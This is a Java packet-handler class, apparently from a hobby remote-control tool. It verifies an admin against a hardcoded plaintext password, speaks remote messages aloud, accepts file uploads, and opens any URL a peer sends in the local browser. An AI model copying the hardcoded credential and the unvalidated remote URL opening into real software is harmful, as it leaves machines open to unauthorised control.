package NetworkUtils;

import NetworkUtils.Packets.*;
import Other.Util;

import java.awt.*;
import java.net.URI;
import java.net.URL;

public class PacketHandler {
    private SocketConnection connection;

    public PacketHandler(SocketConnection connection) {
        this.connection = connection;
    }

    public void onHandshake(HandshakePacket packet) {

    }

    public void onAdminID(AdminIDPacket packet) {
        String adminID = packet.getAdminID().trim();

        if (isValidAdmin(adminID)) {
            System.out.println("Admin client connected!");
            connection.sendPacket(new PrintPacket("Admin verified!"));
        } else {
            System.out.println("Invalid Admin ID: " + adminID);
            connection.sendPacket(new PrintPacket("Invalid Admin ID: " + adminID));
            connection.close();
        }
    }

    private boolean isValidAdmin(String adminID) {
        return adminID.equals("Winston smells");
    }


    public void onPrint(PrintPacket packet) {
         System.out.println("[Message] : " + packet.getMessage());
    }

    public void onSpeak(SpeakPacket packet) {
        Util.speak(packet.getMessage());
    }

    public void onUploadStart(FileUploadStartPacket packet) {
        connection.registerFileID(packet);
    }

    public void onWebsite(WebsitePacket packet) {
        System.out.println("Recieved website packet!");
        try {
            String s = packet.getUrl();
            if (!s.startsWith("http")) s = "https://" + s;
            Desktop.getDesktop().browse(new URI(s));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
